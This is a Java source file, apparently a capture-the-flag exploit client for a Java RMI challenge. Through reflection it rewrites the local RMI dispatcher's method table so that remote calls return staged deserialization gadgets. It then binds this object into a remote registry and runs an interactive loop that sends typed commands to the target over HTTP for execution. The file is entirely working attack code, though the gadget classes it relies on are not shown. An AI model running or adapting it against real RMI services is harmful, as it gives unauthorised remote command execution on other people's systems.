package com.ctf.threermi;

import sun.rmi.server.Dispatcher;
import sun.rmi.server.UnicastRef;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.server.Util;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.ObjectTable;
import sun.rmi.transport.Target;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.rmi.Remote;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Map;
import java.util.Scanner;

public class Main {

    public static void main(String[] args) throws Throwable {
        System.setProperty("java.rmi.server.hostname", System.getenv("HOSTNAME"));

        String bindName = "user_" + System.currentTimeMillis();

        Exploit localExploit = new Exploit();
        Remote remoteExploit = UnicastRemoteObject.exportObject(localExploit, 50805);

        Target target = ObjectTable.getTarget(localExploit);

        Field dispatcherField = Target.class.getDeclaredField("disp");
        dispatcherField.setAccessible(true);
        Dispatcher dispatcher = (Dispatcher) dispatcherField.get(target);

        Field hashToMethod_MapField = UnicastServerRef.class.getDeclaredField("hashToMethod_Map");
        hashToMethod_MapField.setAccessible(true);
        Map<Long, Method> hashToMethod_Map = (Map<Long, Method>) hashToMethod_MapField.get(dispatcher);

        hashToMethod_Map.put(Util.computeMethodHash(UserInter.class.getDeclaredMethod("sayHello", String.class)), Exploit.class.getDeclaredMethod("getStage1Gadget", String.class));
        hashToMethod_Map.put(Util.computeMethodHash(UserInter.class.getDeclaredMethod("getGirlFriend")), Exploit.class.getDeclaredMethod("getStage2Gadget"));
        hashToMethod_Map.put(Util.computeMethodHash(FactoryInter.class.getDeclaredMethod("getObject")), Exploit.class.getDeclaredMethod("getStage3Gadget"));

        localExploit.ref = new UnicastRef(((UnicastServerRef) dispatcher).getLiveRef());
        localExploit.name = bindName;

        System.out.println("[+] connected to remote registry");
        Registry registry = (Registry) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(),
                new Class[]{Registry.class},
                new RemoteObjectInvocationHandler(new UnicastRef(
                        new LiveRef(new ObjID(ObjID.REGISTRY_ID), new TCPEndpoint(System.getenv("REMOTE"), 1099), false))
                )
        );
        for (String s : registry.list()) {
            System.out.println("[+] found binding " + s);
        }

        System.out.println("[+] binding " + bindName + " to " + localExploit.getClass().getName());
        registry.bind(bindName, remoteExploit);

        System.out.println("[+] done!");

        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("<<< ");
            localExploit.command = scanner.nextLine();

            new URL("http://" + System.getenv("REMOTE") + ":8080/?" + bindName).openConnection().getInputStream();
        }
    }
}